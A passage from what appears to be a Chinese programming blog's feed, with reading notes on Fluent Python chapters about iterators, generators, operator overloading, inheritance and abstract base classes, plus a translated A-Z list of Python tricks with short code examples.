14.1 从序列开始我们首先实现一个Sentence类， 通过索引从文本提取单词。 12345678910111213import reimport reprlib RE_WORD = re.compile('\w+') class Sentence: def __init__(self, text): self.text = text self.words = RE_WORD.findall(text) def __getitem__(self, index): return self.words[index] def __len__(self): return len(self.words) def __repr__(self): return 'Sentence(%s)' % reprlib.repr(self.text) 序列可以迭代的原因：iter函数。解释器需要迭代对象 x 时，会自动调用 iter(x)。内置的 iter 函数有以下作用。(1) 检查对象是否实现了 __iter__ 方法，如果实现了就调用它，获取一个迭代器。(2) 如果没有实现 __iter__ 方法，但是实现了 __getitem__ 方法，Python 会创建一个迭代器，尝试按顺序（从索引 0 开始）获取元素。(3) 如果尝试失败，Python 抛出 TypeError 异常，通常会提示“C object is not iterable”（C对象不可迭代），其中 C 是目标对象所属的类。任何 Python 序列都可迭代的原因是，它们都实现了 __getitem__ 方法。其实，标准的序列也都实现了 __iter__ 方法 14.2 可迭代对象和迭代器上面一小节我们可以看到迭代器的定义： 使用 iter 内置函数可以获取迭代器的对象。如果对象实现了能返回迭代器的__iter__ 方法，那么对象就是可迭代的。序列都可以迭代；实现__getitem__ 方法，而且其参数是从零开始的索引，这种对象也可以迭代。我们要明确可迭代的对象和迭代器之间的关系：Python 从可迭代的对象中获取迭代器。 下面给出一个简单的例子，使用while循环模拟for循环中的迭代器： 1234567891011121314# for 实现s = 'ABC'for char in s: print(char)# while 实现s = 'ABC'it = iter(s) while True: try: print(next(it)) except StopIteration: del it break 标准的迭代器接口有两个方法。 __next__ 返回下一个可用的元素，如果没有元素了，抛出 StopIteration 异常。 __iter__ 返回 self，以便在应该使用可迭代对象的地方使用迭代器，例如在 for 循环中。 这个接口在 collections.abc.Iterator 抽象基类中制定。这个类定义了 __next__ 抽象方法，而且继承自 Iterable 类；__iter__ 抽象方法则在 Iterable 类中定义。 因为迭代器只有__next__ 和__iter__方法，所以迭代器没办法检查遗漏的元素和‘还原’迭代器， 如果想再次迭代， 还是需要传入被迭代的对象。由于Iterator.__init__是返回实例本身，传入迭代器无法还原已经迭代过的元素。 14.3 典型的迭代器这一节会将迭代器和可迭代对象分离开来，让我们更加清楚迭代器和可迭代对象的关系 123456789101112131415161718192021222324252627import reimport reprlibRE_WORD = re.compile('\w+')class Sentence: def __init__(self, text): self.text = text self.words = RE_WORD.findall(text) def __repr__(self): return 'Sentence(%s)' % reprlib.repr(self.text) def __iter__(self): return SentenceIterator(self.words)class SentenceIterator: def __init__(self, words): self.words = words self.index = 0 def __next__(self): try: word = self.words[self.index] except IndexError: raise StopIteration() self.index += 1 return word def __iter__(self): return self 如果在Sentence中实现__next__方法， 可以让Sentence同时成为可迭代对象和迭代器。但是这是一个相当糟糕的设计。可迭代的对象一定不能是自身的迭代器 迭代器模式中指明， 迭代器应该有以下特点： 访问一个聚合对象的内容而无需暴露它的内部表示 支持对聚合对象的多种遍历(每次调用iter()都新建一个独立的迭代器) 为遍历不同的聚合结构提供统一的接口 14.4 生成器函数Python中实现上一节相同功能的方式是使用生成器函数代替额外实现的迭代器。 12345678910111213import reimport reprlibRE_WORD = re.compile('\w+')class Sentence: def __init__(self, text): self.text = text self.words = RE_WORD.findall(text) def __repr__(self): return 'Sentence(%s)' % reprlib.repr(self.text) def __iter__(self): for word in self.words: yield word return 相比起上一节的实现简单许多。 只要 Python 函数的定义体中有 yield 关键字，该函数就是生成器函数。调用生成器函数时，会返回一个生成器对象。也就是说，生成器函数是生成器工厂。 14.5 生成器的惰性实现re.finditer是re.findall的惰性版本， 返回的不是一个列表而是一个生成器，这样也能节省大量内存。 1234567891011import reimport reprlibRE_WORD = re.compile('\w+')class Sentence: def __init__(self, text): self.text = text def __repr__(self): return 'Sentence(%s)' % reprlib.repr(self.text) def __iter__(self): for match in RE_WORD.finditer(self.text): yield match.group() 使用finditer使得Sentence的元素变得可以惰性获得了。 14.6 生成器表达式下面使用生成器表达式构建生成器, 会使代码更加简洁12345678910import reimport reprlibRE_WORD = re.compile('\w+')class Sentence: def __init__(self, text): self.text = text def __repr__(self): return 'Sentence(%s)' % reprlib.repr(self.text) def __iter__(self): return (match.group() for match in RE_WORD.finditer(self.text)) 14.7 yeild from 注: yeild from 是Python3.3中新出现的语法 如果生成器函数需要产出另一个生成器生成的值，传统的解决方法是使用嵌套的 for 循环。例如： 123456789&gt;&gt;&gt; def chain(*iterables):... for it in iterables:... for i in it:... yield i...&gt;&gt;&gt; s = 'ABC'&gt;&gt;&gt; t = tuple(range(3))&gt;&gt;&gt; list(chain(s, t))['A', 'B', 'C', 0, 1, 2] 这个chain生成器函数吧操作依次交给各个可迭代对象处理。我们可以用下面的方法简化： 123456&gt;&gt;&gt; def chain(*iterables):... for i in iterables:... yield from i...&gt;&gt;&gt; list(chain(s, t))['A', 'B', 'C', 0, 1, 2] 可以看出，yield from i 完全代替了内层的 for 循环， 使得代码简化很多。 14.8 深入分析iter()函数在 Python 中迭代对象 x 时会调用 iter(x), 这是上文中我们反复提到的, 这也是iter()最常见的用法。 iter 函数还有一个鲜为人知的用法：传入两个参数，使用常规的函数或任何可调用的对象创建迭代器。这样使用时，第一个参数必须是可调用的对象，用于不断调用（没有参数），产出各个值；第二个值是哨符，这是个标记值，当可调用的对象返回这个值时，触发迭代器抛出 StopIteration 异常，而不产出哨符。 例子：12345678# 掷骰子直到掷出1点from random import randintdef d6(): return randint(1, 6)d6_iter = iter(d6, 1)for roll in d6_iter: print(roll) 14.9 生成器当成协程 Python 2.5 实现了“PEP 342 — Coroutines via Enhanced Generators”（https://www.python.org/dev/peps/pep-0342/ ）。这个提案为生成器对象添加了额外的方法和功能，其中最值得关注的是 .send() 方法， 这个函数让生成器变身为协程。 与 .__next__() 方法一样，.send() 方法致使生成器前进到下一个 yield 语句。不过，.send() 方法还允许使用生成器的客户把数据发给自己，即不管传给 .send() 方法什么参数，那个参数都会成为生成器函数定义体中对应的 yield 表达式的值。也就是说，.send() 方法允许在客户代码和生成器之间双向交换数据。而 .__next__() 方法只允许客户从生成器中获取数据。 生成器用于生成供迭代的数据 协程是数据的消费者 为了避免脑袋炸裂，不能把这两个概念混为一谈 协程与迭代无关 注意，虽然在协程中会使用 yield 产出值，但这与迭代无关 ——David Beazley “A Curious Course on Coroutines and Concurrency” 基于这几点， 本章不讨论协程 14.9 小结Python 语言对迭代的支持非常深入, Python 已经融合（grok）了迭代器。Python 从语义上集成迭代器模式是个很好的例证，说明设计模式在各种编程语言中使用的方式并不相同。]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Iterable</tag>
        <tag>Iterator</tag>
        <tag>Generator</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python常用的一些小技巧(语法糖 etc.)]]></title>
    <url>%2F2018%2F09%2F17%2Fsome_python_tricks%2F</url>
    <content type="text"><![CDATA[本文分享一些使用 Python 的技巧，顺序按照 A-Z 排列。 all or anyPython 非常受欢迎的原因之一是其可读性和表达性。 人们还经常把 Python 笑称为「可执行伪码（executable pseudocode）」。但是，当你可以编写这样的代码时，很难去反驳这种言论： 12345678910111213x = [True, True, False]if any(x): print("At least one True")if all(x): print("Not one False")if any(x) and not all(x): print("At least one True and one False") bashplotlib想在控制台中绘图吗？ 1$ pip install bashplotlib 使用上面的行，即可在控制台中绘图。 collectionsPython 有一些很棒的默认数据类型，但有时候它们可能不会尽如你意。 不过，Python 标准库提供了 collections 模块。这个方便的附加组件可以为你提供更多数据类型。 collections 模块：https://docs.python.org/3/library/collections.html 123456789from collections import OrderedDict, Counter# Remembers the order the keys are added!x = OrderedDict(a=1, b=2, c=3)# Counts the frequency of each charactery = Counter("Hello World!") dir你是否想过如何查看 Python 对象内部及其具有哪些属性？ 输入以下命令行：12345&gt;&gt;&gt; dir()&gt;&gt;&gt; dir("Hello World")&gt;&gt;&gt; dir(dir) 当以交互方式运行 Python 时，这可能是一个非常有用的功能，并且可以动态地探索你正在使用的对象和模块。 想要了解更多，点这里 https://docs.python.org/3/library/functions.html#dir emoji是的，真的有。请点击这里 https://pypi.org/project/emoji/ 1$ pip install emoji 别以为我不知道你会偷偷试它→→12345from emoji import emojizeprint(emojize(":thumbs_up:"))👍 from __future__ importPython 流行的一个结果是，总有新版本正在开发中。新版本意味着新功能——除非你的版本已经过时。 不过，别担心。__future__模块允许用户导入新版 Python 的功能。这简直就像时间旅行，或者魔法什么的。 __future__模块：https://docs.python.org/2/library/\*future\*.html 123from \_\_future\_\_ import print_functionprint("Hello World!") geopy地理（Geography）对于程序员来说可能是一个具有挑战性的领域。但是 geopy 模块让它变得异常简单。 geopy 模块：https://geopy.readthedocs.io/en/latest/1$ pip install geopy 它通过抽取一系列不同地理编码服务的 API 来工作，使用户获取一个地方的完整街道地址、纬度、经度，甚至海拔高度。 另外一个有用的功能是距离：它可以用你喜欢的度量单位计算出两个位置之间的距离。 123456789from geopy import GoogleV3place = "221b Baker Street, London"location = GoogleV3().geocode(place)print(location.address)print(location.location) howdoi陷入编码问题，却不记得以前见过的解决方案？需要检查 StackOverflow，但不想离开终端？ 那么你需要这个有用的命令行工具：https://github.com/gleitz/howdoi。 1$ pip install howdoi 无论你有什么问题都可以问它，它会尽力回答。12345$ howdoi vertical align css$ howdoi for loop in java$ howdoi undo commits in git 但是请注意——它会从 StackOverflow 的最高票答案中抓取代码。也就是说它提供的信息并非总是有用……1$ howdoi exit vim inspectPython 的 inspect 模块非常有助于理解问题背后的详情。你甚至可以在 inspect 模块上调用其方法！ inspect 模块：https://docs.python.org/3/library/inspect.html 下面的代码示例使用 inspect.getsource() 打印自己的源代码。它还使用 inspect.getmodule() 打印定义它的模块。 最后一行代码打印出自己的行号。1234567import inspectprint(inspect.getsource(inspect.getsource))print(inspect.getmodule(inspect.getmodule))print(inspect.currentframe().f_lineno) 当然，除了这些琐碎的用途之外，inspect 模块还能帮助你理解代码正在做的事。你还可以用它编写自文档化代码。 JediJedi 库是一个自动完成和代码分析的库。它使代码编写变得更快、效果更高。 除非你正在开发自己的 IDE，否则你肯定会对使用 Jedi 库作为编辑插件很感兴趣。 Jedi：https://jedi.readthedocs.io/en/latest/docs/usage.html 你可能已经在使用 Jedi 了。IPython 项目就使用 Jedi 实现代码自动完成功能。 **kwargs学习任何语言时都会遇到很多里程碑。对于 Python 来说，理解神秘的**kwargs 语法可能算是其中之一。 词典对象前面的双星号可以让你把该词典的内容作为命名参数输入到函数中。 词典的秘钥是参数名，值是传递给函数的值。你甚至不需要称它为 kwargs！ 12345678910111213dictionary = &#123;"a": 1, "b": 2&#125;def someFunction(a, b): print(a + b) return# these do the same thing:someFunction(**dictionary)someFunction(a=1, b=2) 当你想编写能够处理事先未定义的命名参数的函数时，这个很有用。 列表推导式（List comprehensions）我最喜欢 Python 编程的原因之一是它的列表推导式 https://docs.python.org/3/tutorial/datastructures.html#list-comprehensions 这些表达式使得编写干净易读的代码变得很容易，那些代码读起来几乎像自然语言一样。 关于它们的更多使用信息请查看：https://www.learnpython.org/en/List_Comprehensions 123456789101112131415numbers = [1,2,3,4,5,6,7]evens = [x for x in numbers if x % 2 is 0]odds = [y for y in numbers if y not in evens]cities = ['London', 'Dublin', 'Oslo']def visit(city): print("Welcome to "+city)for city in cities: visit(city) mapPython 通过许多内置功能支持函数式编程。map() 函数是最有用的函数之一——特别是当它与 lambda 函数结合使用时。 lambda 函数：https://docs.python.org/3/tutorial/controlflow.html#lambda-expressions 1234567x = [1, 2, 3]y = map(lambda x : x + 1 , x)# prints out [2,3,4]print(list(y)) 在上面的例子中，map() 将一个简单的 lambda 函数应用于 x 中的每个元素。它返回一个 map 对象，该对象可以被转换成可迭代的对象，如列表或元组。 newspaper3k如果你之前没有见过它，那么我建议你先查看 https://pypi.org/project/newspaper3k/。 它可以帮助你从大量顶级国际出版物中检索到新闻文章和相关元数据。你可以检索图像、文本和作者名。 它还有一些内置的 NLP 功能。 地址：https://newspaper.readthedocs.io/en/latest/user_guide/quickstart.html#performing-nlp-on-an-article 如果你想在下一个项目中使用 BeautifulSoup 或其它 DIY 网页抓取库，那么不如使用$ pip install newspaper3k，既省时又省事，何乐而不为呢？ 运算符重载（Operator overloading）Python 支持运算符重载。 它实际上是一个简单的概念。你有没有想过为什么 Python 允许用户使用 + 运算符来将数字相加，并级联字符串？这就是运算符重载在发挥作用。 你可以使用 Python 的标准运算符号来定义对象，这样你可以在与这些对象相关的语境中使用它们。1234567891011121314151617181920212223242526272829class Thing: def __init__(self, value): self.__value = value def __gt__(self, other): return self.__value &gt; other.__value def __lt__(self, other): return self.__value &lt; other.__valuesomething = Thing(100)nothing = Thing(0)# Truesomething &gt; nothing# Falsesomething &lt; nothing# Errorsomething + nothing pprintPython 的默认 print 函数就可以实现打印功能。但如果尝试打印较大的嵌套对象，就会发现打印结果很丑。 这时 Python 标准库的 pretty printer 模块就可以发挥作用了。该模块可以将复杂的结构化对象以一种易读的格式打印出来。 pretty printer 模块：https://docs.python.org/3/library/pprint.html Python 开发者的必备技能之一就是处理复杂的数据结构。1234567891011import requestsimport pprinturl = 'https://randomuser.me/api/?results=1'users = requests.get(url).json()pprint.pprint(users)Queue Python 支持多线程，而这是由 Python 标准库的 Queue 模块支持的。该模块允许用户实现队列（queue）数据结构。队列数据结构允许用户根据特定的规则添加和检索条目。 『First in, first out』 (FIFO) 队列允许用户按照对象被添加的顺序来检索对象。『Last in, first out』 (LIFO) 队列允许用户首先访问最新添加的对象。 最后，优先级队列（priority queue）允许用户根据对象对应的优先级类别来检索对象。 如何使用 queue 在 Python 中实现多线程编程，示例详见：https://www.tutorialspoint.com/python3/python_multithreading.htm。 __repr__在 Python 中定义一个类别或对象时，以「官方」方式将对象表示为字符串很有用。例如：12345&gt;&gt;&gt; file = open('file.txt', 'r')&gt;&gt;&gt; print(file)&lt;open file 'file.txt', mode 'r' at 0x10d30aaf0&gt; 这使代码 debug 变得简单很多。将字符串添加到类别定义，如下所示： 1234567891011class someClass: def __repr__(self): return "&lt;some description here&gt;"someInstance = someClass()# prints &lt;some description here&gt;print(someInstance) shPython 是一种伟大的脚本语言，不过有时使用标准 os 和 subprocess 库会有点棘手。 sh 库提供了一种不错的替代方案。 sh 库：http://amoffat.github.io/sh/ 该库允许用户像使用普通函数一样调用任意程序，这对自动化工作流和任务非常有用。1234567891011from sh import *sh.pwd()sh.mkdir('new_folder')sh.touch('new_file.txt')sh.whoami()sh.echo('This is great!') 类型提示（Type hints）Python 是动态语言。在定义变量、函数、类别等时无需指定数据类型。 这有利于缩短开发周期。但是，简单的类型错误（typing issue）导致的运行时错误真的太烦了。 从 Python 3.5 版本开始，用户可以选择在定义函数时开启类型提示。123def addTwo(x : Int) -&gt; Int: return x + 2 你还可以定义类型别名：123456789101112131415161718192021222324252627from typing import ListVector = List[float]Matrix = List[Vector]def addMatrix(a : Matrix, b : Matrix) -&gt; Matrix: result = [] for i,row in enumerate(a): result_row =[] for j, col in enumerate(row): result_row += [a[i][j] + b[i][j]] result += [result_row] return resultx = [[1.0, 0.0], [0.0, 1.0]]y = [[2.0, 1.0], [0.0, -2.0]]z = addMatrix(x, y) 尽管非强制，但类型注释可以使代码更易理解。 它们还允许你在运行之前使用类型检查工具捕捉 TypeError。在进行大型复杂项目时执行此类操作是值得的。 uuid生成通用唯一标识符（Universally Unique ID，UUID）的一种快速简单方法就是使用 Python 标准库的 uuid 模块。 uuid 模块：https://docs.python.org/3/library/uuid.html 12345import uuiduser_id = uuid.uuid4()print(user_id) 这创建了一个随机化后的 128 比特数字，该数字几乎必然是唯一的。 事实上，可以生成 2¹²²可能的 UUID。这个数字超过了 5,000,000,000,000,000,000,000,000,000,000,000,000。 在给定集合中找出重复数字的可能性极低。即使有一万亿 UUID，重复数字存在的概率也远远低于十亿分之一。 虚拟环境（Virtual environment）这可能是 Python 中我最喜欢的事物了。 你可能同时处理多个 Python 项目。不幸的是，有时候两个项目依赖于相同依赖项的不同版本。那你要安装哪个版本呢？ 幸运的是，Python 支持虚拟环境，这使得用户能够充分利用两种环境。见下列行：12345python -m venv my-projectsource my-project/bin/activatepip install all-the-modules 现在你在一台机器上具备独立的多个 Python 版本了。问题解决！ wikipediaWikipedia 拥有一个很棒的 API，允许用户以编程方式访问巨大体量的免费知识和信息。 wikipedia 模块使得访问该 API 非常便捷。 Wikipedia 模块：https://wikipedia.readthedocs.io/en/latest/quickstart.html 123456789import wikipediaresult = wikipedia.page('freeCodeCamp')print(result.summary)for link in result.links: print(link) 和真实的维基百科网站类似，该模块支持多种语言、页面消歧、随机页面检索，甚至还具备 donate() 方法。 xkcdhumour 是 Python 语言的一个关键特征，其名称来自英国喜剧片《蒙提·派森的飞行马戏团》(Monty Python and the Flying Circus)。Python 的很多官方文档引用了该喜剧片最著名的剧情。 幽默感并不限于文档。试着运行下列行：1import antigravity 将打开 xkcd 画的 Python 漫画。不要改变这一点，Python。不要改变。 YAMLYAML 代表 『YAML Ain』t Markup Language』。它是一种数据格式语言，是 JSON 的超集。 与 JSON 不同，它可以存储更复杂的对象并引用自己的元素。你还可以编写注释，使其尤其适用于编写配置文件。 PyYAML 模块（https://pyyaml.org/wiki/PyYAMLDocumentation）可以让你在 Python 中使用 YAML。 安装：1$ pip install pyyaml 然后导入到项目中：1import yaml PyYAML 使你能够存储任何数据类型的 Python 对象，以及任何用户定义类别的实例。 zip给你支最后一招，非常酷。还在用两个列表来组成一部词典吗？12345keys = ['a', 'b', 'c']vals = [1, 2, 3]zipped = dict(zip(keys, vals)) zip() 内置函数使用多个可迭代对象作为输入并返回元组列表。每个元组按位置索引对输入对象的元素进行分组。 你也可以通过调用*zip() 来「解压」对象。 原文链接：https://medium.freecodecamp.org/an-a-z-of-useful-python-tricks-b467524ee747]]></content>
      <categories>
        <category>随手摘录</category>
      </categories>
      <tags>
        <tag>Python Tricks</tag>
        <tag>Syntactic sugar</tag>
        <tag>语法糖</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fluent Python 第十三章 正确使用运算符重载]]></title>
    <url>%2F2018%2F08%2F29%2Ffluent-python-13%2F</url>
    <content type="text"><![CDATA[Fluent Python 第十三章读书报告 Chapter 13. Operator Overloading: Doing It Right第十三章: 正确使用运算符重载运算符重载的作用是让用户定义的对象使用中缀运算符或一元运算符。宽泛一些来讲，Python中的函数调用（()）,属性访问（.）,和元素访问/切片（[]）也是运算符，不过本章只讨论一元运算符和中缀运算符。 接下来我们会讨论这几个问题: Python中如何处理运算符中不同类型的操作数 使用压制类型或者显式类型检查处理不同类型的操作数 中缀运算符如何表明自己无法处理操作数 众多比较运算符(==, &gt; ,&lt;=)等的特殊行为 增量赋值运算符的默认处理方式和重载方式 13.1 运算符重载基础Python 在运算符重载方面进行了一些限制，做好了灵活性、可用性和安全性方面的平衡。 不能重载内置类型的运算符 不能新建运算符，只能使用现有的 某些运算符不能重载——is、and、or、not 13.2 一元运算符Python语言参考手册中，列出了3个一元运算符: - 取负运算符，对应特殊方法 __neg__ + 取正运算符，对应特殊方法 __pos__ ~ 取反运算符，对应特殊方法 __invert__ Python 中还有一个较为特殊的一元运算符abs(), 取绝对值操作符，对应的是特殊方法 __abs__ 支持一元运算符很简单，只需要实现相应的特殊方法。这些特殊方法只有一个参数self。需要遵循的基本规则是始终返回一个新对象，也就是说不能修改self， 而是要创建并返回合适类型的新实例。 一般来说， -，+ 返回与self同一类型的实例。abs一般返回一个标量。对于~来说，很难说什么结果是合理的，例如ORM中SQL WHERE语句取反就应该返回反集。 13.3 为Vector重载向量加法运算符+之前的章节中我们实现过向量Vector 现在为它实现运算符重载 序列应当支持+运算符(用于拼接)， 以及*运算符(用于重复复制) 然而我们要做的是，为向量实现向量加法和向量乘法运算(点乘) 我们想象中的向量加法应该实现下面两点: 对于两个维度相同的向量， 分量分别相加 对于两个维度不同的向量，分量少的尾部补零向量再相加 基于以上两点，可以初步写出相应的特殊方法: 123def __add__(self, other): pairs = itertools.zip_longest(self, other, fillvalue=0.0) return Vector(a+b for a,b in pairs) 需要注意的点： 实现医院运算符和中缀运算符的特殊方法一定不能修改操作数，这些操作符理应返回新对象，只有增量赋值表达式可能修改第一个操作数。 为了支持涉及不同类型的运算， Python 为中缀运算符特殊方法提供了特殊的分派机制 ， 对于表达式a+b来说，解释器会执行以下几步操作 如果a有__add__方法， 而且返回值不是NotImplemented, 调用a.__add__(b) 如果没有__add__方法， 或者__add__方法返回NotImplemented, 检查b有没有__radd__， 如果有且返回不是NotImplemented，返回b.__radd__(a) 如果b没有__radd__或者__radd__返回NotImplemented, 抛出TypeError, traceback 中会指明操作数不支持。 具体的情况如下图所示: NotImplemented和NotImplementedError是不同的， 前者是特殊的单例值，在运算符无法处理操作数时返回（return）给解释器，后者是一种异常，抽象类抛出（raise）这个异常提醒子类必须覆盖。 NotImplemented 与Error的不同在于，返回NotImplemented时， 另一个操作数还有机会执行反向的运算方法。这是Python种运算符的一种分派机制。 13.4 重载标量乘法运算符*向量的标量积(scalar product) 有两种: 向量与标量相乘， 结果是与原向量方向相同， 模是原向量模的标量倍的向量 向量与向量相乘，结果是各个分量的积求和的标量 NumPy等库目前的做法是，不重载这两种意义的*， 向量与向量相乘的情况用 numpy.dot()处理 类似加号的重载， 我们为Vector 写好了__mul__和__rmul__方法。 1234def __mul__(self, scalar): return Vector(n * scalar for n in self)def __rmul__(self, scalar): return self * scalar Python 3.5 以后的版本提供了@运算符， 计算两个向量相乘的标量积。特殊方法为__matmul__ 13.5 比较运算符Python 解释器对众多比较运算符的处理与前文类似，不过有两点比较明显的区别： 正向和反向调用使用的是同一系列方法。例如，对 == 来说，正向和反向调用都是 __eq__ 方法，只是把参数对调了；而正向的 __gt__ 方法调用的是反向的 __lt__ 方法，并把参数对调。 对 == 和 != 来说，如果反向调用失败，Python 会比较对象的 ID，而不抛出TypeError。 Python3 中 __ne__的结果是对 __eq__ 方法取反的结果， 一些不合适的比较会返回TypeError而不比较对象ID 13.6 增量赋值运算符 增量赋值不会修改不可变目标，而是新建实例然后重新绑定。需要指出的是， 不可变类型一定不能实现就地特殊方法，即修改实例本身的方法 如果一个类没有实现就地运算符对应的特殊方法，增量赋值运算符只是语法糖：a += b 的作用与 a = a + b 完全一样。对不可变类型来说，这是预期的行为，而且，如果定义了__add__ 方法的话，不用编写额外的代码，+= 就能使用。然而，如果实现了就地运算符方法，例如 __iadd__，计算 a += b 的结果时会调用就地运算符方法。这种运算符的名称表明，它们会就地修改左操作数，而不会创建新对象作为结果。 13.7 小结本章主要介绍了Python中对运算符重载的做法， 限制和特性。]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>fluent python</tag>
        <tag>Operator Overloading</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fluent Python 第十二章 继承的优缺点]]></title>
    <url>%2F2018%2F07%2F28%2Ffluent-python-12%2F</url>
    <content type="text"><![CDATA[Fluent Python 第十二章读书报告 Chapter 12. Inheritance: For Good or For Worse第十二章: 继承的优缺点 推出继承的初衷是让新手顺利使用只有专家才能设计出来的框架。 —— Alan Kay 本章讨论继承和子类化，重点是说明对Python而言尤为重要的两个细节： 子类化内置类型的缺点 多重继承和方法解析顺序 12.1 子类化内置类型的麻烦之处Python中的内置类型子类化有一个重要的注意事项：内置类型(使用C语言编写)不会调用用户定义的类覆盖的特殊方法。 内置类型的这种行为违背了面向对象编程的一个基本原则：从实例所属的类搜索方法，这是一个十分糟糕的局面。 所以在子类化的时候，不应该选择内置类型，而应该选择collections中的类进行继承。 12.2 多重继承和方法解析顺序任何实现多重继承的语言都要处理潜在的命名冲突，这种冲突是由不相关的祖先类同名的方法引起的，称为“菱形问题”。 python能区分子类调用的是哪一个方法，是因为Python会按照特定的顺序遍历继承图，这个顺序叫做方法解析顺序(Method Resolution Order，MRO), Python中的类都有一个名为__mro__的属性，它的值是一个元组，按照方法戒子顺序列出各个超类，从当前类一直向上，直到object类。例如tenserflow中的Variable类 123&gt;&gt;&gt; import tensorflow as tf&gt;&gt;&gt; tf.Variable.__mro__&gt;&gt;&gt; (&lt;class 'tensorflow.python.ops.variables.Variable'&gt;, &lt;class 'tensorflow.python.training.checkpointable.base.CheckpointableBase'&gt;, &lt;class 'object'&gt;) 如果把方法调用委托给超类，可以有下面两种选择: 使用super()函数如Foo_son.super().bar(), 这个方法的好处在于安全，不会过时。适合使用的场景: 调用框架或者不受自己控制的类层次结构中的方法 如果想要绕过方法解析, 直接调用超类的某个方法，可以直接使用超类类名代替super()函数，如Foo.bar() 方法解析顺序不仅考虑继承图，还考虑子类声明中列出超类的顺序。也就是说，如果把 D 类声明为 class D(C, B):，那么 D 类的__mro__ 属性就是：先搜索 C 类，再搜索 B 类。 12.3 多重继承的真实应用标准库中，GUI工具包Tkinter把多重继承用到了极致。 其中几个类： Toplevel：表示 Tkinter 应用程序中顶层窗口的类。 Widget：窗口中所有可见对象的超类。 Button：普通的按钮小组件。 Entry：单行可编辑文本字段。 Text：多行可编辑文本字段 但由于Tkinter开发时间比较久远，很多使用多重继承不能称作是最佳的实践。后面会对Tkinter使用多重继承的可取之处和不当之处进行讨论 12.4 处理多重继承 ……我们需要一种更好的、全新的继承理论（目前仍是如此）。例如，继承和实例化（一种继承方式）混淆了语用（比如为了节省空间而重构代码）和语义（用途太多了，比如特殊化、普遍化、形态，等等）。 ——Alan Kay 如上面引用的一段话， 继承有很多用途，而多重继承增加了可选方案和复杂度。使用多重继承容易得出令人费解和脆弱的设计。 暂时还没有针对多重继承完整的理论，下面是避免把类图搅乱的一些建议。 把接口继承和实现继承区分开来 使用多重继承是，一定要明确为什么创建子类。一般原因可能有： 继承接口，创建子类型， 实现“是什么” 继承实现，通过继承避免代码复用其实这两条经常同时出现，不过只要可能的话，一定要明确区分。前者是支撑框架的支柱，后者是实现细节，通常可以换用组合和委托模式。 使用抽象基类显式表示接口 如果类的作用是定义接口，应该明确定为抽象基类 通过混入(mixin)重用代码 如果一个类的作用是为多个不相关的子类提供方法实现，从而实现重用，但不体现“是什么”关系，应该把那个类明确地定义为混入类（mixin class）。从概念上讲，混入不定义新类型，只是打包方法，便于重用。混入类绝对不能实例化，而且具体类不能只继承混入类。混入类应该提供某方面的特定行为，只实现少量关系非常紧密的方法。 在名称中明确指明混入 混入类应该以Mixin 作为后缀(在django的GenericViews中尤为常见) 抽象基类可以作为混入，反之不成立。 抽象基类可以实现具体方法，因此也可以作为混入使用。抽象基类可以作为其他类的唯一基类，而混入决不能作为唯一的超类，除非继承另一个更具体的混入。 抽象基类中实现的具体方法只能与抽象基类及其超类中的方法协作。 不要子类化多个具体类 具体类的超类中除了一个具体超类之外，其余的都应该是抽象基类或混入。 为用户提供聚合类 如果抽象基类或混入的组合对客户代码非常有用，那就提供一个类，使用易于理解的方式把它们结合起来。 Grady Booch 把这种类称为聚合类（aggregate class）。 聚合类恰如其名，只做聚合，不额外实现类方法 “优先使用对象组合，而不是类继承” 优先使用组合能让设计更灵活。组合和委托可以代替混入，把行为提供给不同的类，但是不能取代接口继承去定义类型层次结构。 12.5 小结本章着重探讨了多重继承这把双刃剑。讲述了Python中的MRO（方法解析顺序），探讨了多重继承实现的一些可以称之为准则的最佳实践标准。]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fluent python</tag>
        <tag>inheritance</tag>
        <tag>multiple inheritance</tag>
        <tag>mro</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fluent Python 第十一章 从协议到抽象基类]]></title>
    <url>%2F2018%2F07%2F28%2Ffluent-python-11%2F</url>
    <content type="text"><![CDATA[Fluent Python 第十二章读书报告 Chapter 11. Interfaces From Protocols to ABCs第十一章: 从协议到抽象基类本章主要讨论接口，从鸭子类型的动态协议到使接口更加明确，能验证实现是否符合规定的抽象基类（ABC） 本章会专门讲解抽象基类。首先，本章说明抽象基类的常见用途：实现接口时作为超类使用。然后，说明抽象基类如何检查具体子类是否符合接口定义，以及如何使用注册机制声明一个类实现了某个接口，而不进行子类化操作。最后，说明如何让抽象基类自动“识别”任何符合接口的类——不进行子类化或注册。 Python 中的接口和协议Python中，我们把协议定为非正式的接口， 协议也是Python这类动态语言实现多态的方式。 Python 中接口的运作方式: Python 中没有interface 关键字， 并且除了抽象基类（ABC）,每个类都有接口，实现方式为：类实现或继承公开属性(方法或者数据属性) 关于接口有一个实用的补充定义：对象公开方法的子集，让对象在系统中扮演特定角色。借口是实现特定角色的方法的集合，这就是协议。协议与继承没有关系，一个类可能实现多个接口使同一个实例扮演多个角色。 协议不是正式的接口, 没有接口一致性的各种强制，因此一个类可以只实现部分接口。 Python中的序列协议Python中数据模型的哲学是尽量支持基本协议， 下面的图展示了抽象基类Sequence的正式接口。 如果没有实现__iter__和__contains__方法， Python会调用__getitem__方法， 设法让迭代和in运算符可用。几十一个对象只实现了__getitem__方法，也能进行迭代，为了迭代对象，解释器会尝试调用两个不同的方法。 使用猴子补丁在运行时实现协议 得益于鸭子类型，如果遵守既定的协议，很有可能增加利用现有的标准库和第三方代码的可能性。猴子补丁: 在运行时修改类或者模块，而不改动源码。这种技术非常强大，但是打补丁的代码和被打补丁的程序需要耦合非常紧密，而且往往要处理没有文档的部分。 协议可以支持猴子补丁， 恰恰说明了协议的动态性： 即使对象一开始没有实现所需的方法，后来用补丁的形式加进去也行。这也是鸭子类型思想的一个缩影。 关于抽象基类和白鹅类型 白鹅类型： 只要cls是抽象基类， 即cls的元类是abc.ABCMeta, 就可以使用isinstance(obj, cls) 抽象基类的本质就是几个特殊方法的集合 可以用instance(obj, cls)检查类是否已经实现了抽象基类定义的api契约。 需要注意的是 生产代码中尽量避免定义抽象基类，极容易因为设计不当造成滥用，滥用抽象基类会造成灾难性的后果 抽象基类是封装框架引入一般性概念和抽象的。 